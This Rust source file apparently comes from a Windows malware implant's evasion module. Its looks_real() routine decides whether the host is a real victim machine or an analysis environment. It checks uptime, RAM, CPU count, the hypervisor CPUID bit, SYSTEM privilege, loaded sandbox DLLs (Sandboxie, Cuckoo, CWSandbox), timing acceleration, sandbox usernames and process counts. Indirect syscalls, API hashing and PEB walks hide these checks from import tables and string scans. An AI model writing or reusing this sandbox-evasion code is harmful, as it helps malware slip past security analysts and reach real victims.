/// Read milliseconds since boot from KUSER_SHARED_DATA — no kernel32 IAT entry on x64.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[inline(always)]
unsafe fn tick_count_ms() -> u64 {
    let tick_low   = *(0x7FFE_0320usize as *const u32) as u64;
    let multiplier = *(0x7FFE_0004usize as *const u32) as u64;
    (tick_low * multiplier) >> 24
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
#[inline(always)]
unsafe fn tick_count_ms() -> u64 {
    windows_sys::Win32::System::SystemInformation::GetTickCount64()
}

/// Query total physical RAM (bytes) and processor count via NtQuerySystemInformation on x64.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn system_basic_info() -> (u64, u32) {
    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
    use crate::resolve::api_hash::h;
    let mut buf = [0u8; 64usize];
    let st = if let Some((ssn, tramp)) = get_ssn_h(h::NT_QS_INFO) {
        indirect_syscall(ssn, tramp, 0, buf.as_mut_ptr() as usize, 64, 0, 0, 0)
    } else { -1 };
    if st < 0 { return (0, 0); }
    let page_size = u32::from_le_bytes([buf[8],  buf[9],  buf[10], buf[11]]) as u64;
    let num_pages = u32::from_le_bytes([buf[12], buf[13], buf[14], buf[15]]) as u64;
    let num_procs = buf[0x38] as u32;
    (page_size * num_pages, num_procs)
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn system_basic_info() -> (u64, u32) {
    use windows_sys::Win32::System::SystemInformation::{
        GlobalMemoryStatusEx, MEMORYSTATUSEX, GetSystemInfo, SYSTEM_INFO,
    };
    let mut mem_status: MEMORYSTATUSEX = core::mem::zeroed();
    mem_status.dwLength = core::mem::size_of::<MEMORYSTATUSEX>() as u32;
    GlobalMemoryStatusEx(&mut mem_status);
    let mut sysinfo: SYSTEM_INFO = core::mem::zeroed();
    GetSystemInfo(&mut sysinfo);
    (mem_status.ullTotalPhys, sysinfo.dwNumberOfProcessors)
}

/// Read USERNAME from PEB ProcessParameters environment block (no GetUserNameA IAT entry).
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn username_is_sandbox() -> bool {
    let peb: usize;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, preserves_flags));
    let proc_params = *((peb + 0x20) as *const usize);
    let env_ptr = *((proc_params + 0x80) as *const usize) as *const u16;
    if env_ptr.is_null() { return false; }
    // "USERNAME=" as wide chars
    let prefix = [85u16, 83, 69, 82, 78, 65, 77, 69, 61];
    let mut ptr = env_ptr;
    loop {
        if *ptr == 0 { break; }
        let mut m = true;
        for (i, &c) in prefix.iter().enumerate() {
            if *ptr.add(i) != c { m = false; break; }
        }
        if m {
            let mut lower = Vec::<u8>::new();
            let mut p = ptr.add(prefix.len());
            while *p != 0 { lower.push((*p as u8).to_ascii_lowercase()); p = p.add(1); }
            const BAD: &[&[u8]] = &[b"sandbox", b"maltest", b"virus", b"cuckoo", b"john", b"test"];
            return BAD.iter().any(|&n| lower == n);
        }
        while *ptr != 0 { ptr = ptr.add(1); }
        ptr = ptr.add(1);
    }
    false
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn username_is_sandbox() -> bool {
    use windows_sys::Win32::System::WindowsProgramming::GetUserNameA;
    let mut buf = [0u8; 64];
    let mut len = 64u32;
    if GetUserNameA(buf.as_mut_ptr(), &mut len) == 0 { return false; }
    let lower: Vec<u8> = buf[..len.saturating_sub(1) as usize]
        .iter().map(|&b| b.to_ascii_lowercase()).collect();
    const BAD: &[&[u8]] = &[b"sandbox", b"maltest", b"virus", b"cuckoo", b"john", b"test"];
    BAD.iter().any(|&n| lower == n)
}

/// Count processes via NtQuerySystemInformation — no ToolHelp IAT entries on x64.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn process_count_low() -> bool {
    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
    use crate::resolve::api_hash::h;
    let Some((ssn, tramp)) = get_ssn_h(h::NT_QS_INFO) else { return false; };
    let mut needed = 0u32;
    let mut dummy = [0u8; 8];
    indirect_syscall(ssn, tramp, 5, dummy.as_mut_ptr() as usize, 8, &mut needed as *mut u32 as usize, 0, 0);
    let buf_size = (needed as usize + 0x1000) & !0xFFF;
    let mut buf = vec![0u8; buf_size];
    let st = indirect_syscall(ssn, tramp, 5, buf.as_mut_ptr() as usize, buf_size, &mut needed as *mut u32 as usize, 0, 0);
    if st < 0 { return false; }
    let mut count = 0usize;
    let mut offset = 0usize;
    loop {
        count += 1;
        let next_off = u32::from_le_bytes([buf[offset], buf[offset+1], buf[offset+2], buf[offset+3]]) as usize;
        if next_off == 0 { break; }
        offset += next_off;
    }
    count < 50
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn process_count_low() -> bool {
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
    use crate::resolve::api_hash::h;
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snap == -1isize { return false; }
    let mut entry: PROCESSENTRY32W = core::mem::zeroed();
    entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
    let mut count = 0usize;
    if Process32FirstW(snap, &mut entry) != 0 {
        count += 1;
        while Process32NextW(snap, &mut entry) != 0 { count += 1; }
    }
    if let Some((sc, tc)) = get_ssn_h(h::NT_CLOSE) { indirect_syscall(sc, tc, snap as usize, 0, 0, 0, 0, 0); }
    count < 50
}

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
unsafe fn hypervisor_bit_set() -> bool {
    let ecx: u32;
    core::arch::asm!(
        "cpuid",
        inout("eax") 1u32 => _,
        out("ebx") _,
        out("ecx") ecx,
        out("edx") _,
        options(nostack, preserves_flags),
    );
    (ecx >> 31) & 1 != 0
}

#[cfg(target_os = "windows")]
unsafe fn running_as_system() -> bool {
    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
    use crate::resolve::api_hash::h;

    // NtOpenProcessToken: (ProcessHandle, DesiredAccess=TOKEN_QUERY=0x8, TokenHandle)
    let Some((ssn_opt, tramp_opt)) = get_ssn_h(h::NT_OPEN_TOK) else { return false; };
    let mut token_handle: isize = 0;
    let st = indirect_syscall(ssn_opt, tramp_opt,
        usize::MAX, 0x8,
        &mut token_handle as *mut isize as usize,
        0, 0, 0);
    if st < 0 || token_handle == 0 { return false; }

    let mut buf = vec![0u8; 256];
    let mut return_len = 0u32;
    // NtQueryInformationToken: (TokenHandle, TokenInformationClass=1=TokenUser, Buffer, BufferLength, ReturnLength)
    let ok = if let Some((ssn_qit, tramp_qit)) = get_ssn_h(h::NT_QI_TOKEN) {
        indirect_syscall(ssn_qit, tramp_qit,
            token_handle as usize, 1,
            buf.as_mut_ptr() as usize,
            buf.len() as usize,
            &mut return_len as *mut u32 as usize,
            0)
    } else { -1 };
    if let Some((sc, tc)) = get_ssn_h(h::NT_CLOSE) { indirect_syscall(sc, tc, token_handle as usize, 0, 0, 0, 0, 0); }
    if ok < 0 { return false; }

    // TOKEN_USER.User.Sid points to a SID. S-1-5-18 (LocalSystem) has:
    // Revision=1, SubAuthorityCount=1, IdentifierAuthority={0,0,0,0,0,5}, SubAuthority[0]=18
    let sid_ptr = *(buf.as_ptr() as *const *const u8);
    if sid_ptr.is_null() { return false; }
    let revision      = *sid_ptr;
    let sub_auth_cnt  = *sid_ptr.add(1);
    let auth_6        = *sid_ptr.add(7); // IdentifierAuthority[5] = 5
    let sub_auth_0    = u32::from_le_bytes([
        *sid_ptr.add(8), *sid_ptr.add(9), *sid_ptr.add(10), *sid_ptr.add(11),
    ]);
    revision == 1 && sub_auth_cnt == 1 && auth_6 == 5 && sub_auth_0 == 18
}

/// Returns true if any known sandbox/analysis DLL is loaded into the current process.
/// Uses PEB walk (no GetModuleHandleA) to check without leaving API call strings in IAT.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn analysis_dll_present() -> bool {
    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base};
    // Compile-time hashes; no plaintext DLL names at runtime.
    const HASHES: &[u32] = &[
        djb2_hash_lower(b"sbiedll.dll"),    // Sandboxie
        djb2_hash_lower(b"cmdvrt32.dll"),   // Comodo sandbox
        djb2_hash_lower(b"api_log.dll"),    // CWSandbox
        djb2_hash_lower(b"dir_watch.dll"),  // CWSandbox
        djb2_hash_lower(b"pstorec.dll"),    // Cuckoo stub
        djb2_hash_lower(b"wpespy.dll"),     // WPE Pro packet logger
        djb2_hash_lower(b"vmcheck.dll"),    // VMware check lib
        djb2_hash_lower(b"dbghlp.dll"),     // Debugger helper variant
    ];
    for &h in HASHES {
        if !peb_get_module_base(h).is_null() { return true; }
    }
    false
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn analysis_dll_present() -> bool {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    const DLLS: &[&[u8]] = &[
        b"SbieDll.dll\0", b"cmdvrt32.dll\0", b"api_log.dll\0", b"dir_watch.dll\0",
        b"pstorec.dll\0",  b"wpespy.dll\0",   b"vmcheck.dll\0", b"dbghlp.dll\0",
    ];
    DLLS.iter().any(|&dll| GetModuleHandleA(dll.as_ptr()) != 0)
}

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
unsafe fn rdtsc() -> u64 {
    let lo: u32;
    let hi: u32;
    core::arch::asm!("rdtsc", out("eax") lo, out("edx") hi, options(nostack, preserves_flags, nomem));
    ((hi as u64) << 32) | lo as u64
}

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
unsafe fn time_accelerated() -> bool {
    let t0 = tick_count_ms();
    let tsc0 = rdtsc();
    let mut sink: u64 = 1;
    for i in 0u64..20_000_000u64 { sink = sink.wrapping_add(i); }
    core::hint::black_box(sink);
    let t1 = tick_count_ms();
    let tsc1 = rdtsc();

    let wall_ms = t1.saturating_sub(t0);
    let tsc_delta = tsc1.saturating_sub(tsc0);

    // Impossible: wall says >5ms passed but TSC says <500k cycles (would need >10 MHz clock to run 20M iters that fast)
    if wall_ms > 5 && tsc_delta < 500_000 { return true; }
    // Impossible: claimed effective clock > 100 GHz
    if wall_ms > 0 && (tsc_delta / wall_ms) > 100_000_000 { return true; }
    false
}

#[cfg(target_os = "windows")]
pub unsafe fn looks_real() -> bool {
    // Uptime check: at least 30 minutes (KUSER_SHARED_DATA on x64, kernel32 fallback)
    let uptime_ms = tick_count_ms();
    if uptime_ms < 30 * 60 * 1000 { return false; }

    // RAM and CPU count via NtQuerySystemInformation on x64, Win32 fallback
    let (total_phys, num_procs) = system_basic_info();
    if total_phys < 2u64 * 1024 * 1024 * 1024 { return false; }
    if num_procs < 2 { return false; }

    #[cfg(all(target_arch = "x86_64", target_os = "windows"))]
    if hypervisor_bit_set() { return false; }

    #[cfg(target_os = "windows")]
    if running_as_system() { return false; }

    #[cfg(target_os = "windows")]
    if analysis_dll_present() { return false; }

    #[cfg(all(target_arch = "x86_64", target_os = "windows"))]
    if time_accelerated() { return false; }

    #[cfg(target_os = "windows")]
    if username_is_sandbox() { return false; }

    #[cfg(target_os = "windows")]
    if process_count_low() { return false; }

    true
}
